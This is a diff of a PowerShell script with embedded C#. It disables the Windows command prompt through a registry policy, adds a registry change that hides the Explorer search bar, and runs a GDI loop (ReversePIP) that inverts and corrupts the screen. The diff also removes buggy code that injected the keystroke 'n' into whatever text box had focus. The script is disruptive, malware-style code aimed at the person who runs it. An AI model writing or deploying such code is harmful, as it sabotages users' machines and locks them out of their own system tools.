@@ -37,11 +37,15 @@ $disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
 New-Item -Path $disableCmdPath -Force | Out-Null
 Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
 
+# Create registry key to disable active search bar
+$disableSearchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+New-Item -Path $disableSearchBarPath -Force | Out-Null
+Set-ItemProperty -Path $disableSearchBarPath -Name "ShowSearchBar" -Value 0
+
 $source = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Windows.Forms;
 
 public static class Win32
 {
@@ -62,29 +66,6 @@ public static class Win32
 
     [DllImport("gdi32.dll")]
     static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    static extern IntPtr GetForegroundWindow();
-
-    [DllImport("user32.dll", SetLastError = true)]
-    static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-
-    [DllImport("user32.dll")]
-    static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);
-
-    [DllImport("user32.dll")]
-    static extern IntPtr GetFocus();
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    static extern int GetClassName(IntPtr hWnd, System.Text.StringBuilder lpClassName, int nMaxCount);
-
-    [DllImport("user32.dll")]
-    static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
-
-    const uint WM_SETTEXT = 0x000C;
 
     public static void ReversePIP()
     {
@@ -108,37 +89,10 @@ public static class Win32
 
             // BitBlt with Raster Operation (ROP) Code for XOR Effect
             BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
-
-            // Type "n" into active search bar
-            IntPtr foregroundWindow = GetForegroundWindow();
-            uint foregroundProcessId;
-            GetWindowThreadProcessId(foregroundWindow, out foregroundProcessId);
-            uint currentProcessId = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;
-
-            if (foregroundProcessId != currentProcessId)
-            {
-                AttachThreadInput(foregroundProcessId, currentProcessId, true);
-                IntPtr focusedControlHandle = GetFocus();
-                StringBuilder windowText = new StringBuilder(256);
-                GetWindowText(focusedControlHandle, windowText, 256);
-
-                if (windowText.Length > 0)
-                {
-                    StringBuilder className = new StringBuilder(256);
-                    GetClassName(focusedControlHandle, className, 256);
-
-                    if (className.ToString() == "Edit" || className.ToString() == "SearchBoxText")
-                    {
-                        SendMessage(focusedControlHandle, WM_SETTEXT, 0, "n");
-                    }
-                }
-
-                AttachThreadInput(foregroundProcessId, currentProcessId, false);
-            }
         }
     }
 }
 "@
 
-Add-Type -TypeDefinition $source -ReferencedAssemblies "System.Windows.Forms.dll"
+Add-Type -TypeDefinition $source -Language CSharp
 [Win32]::ReversePIP()
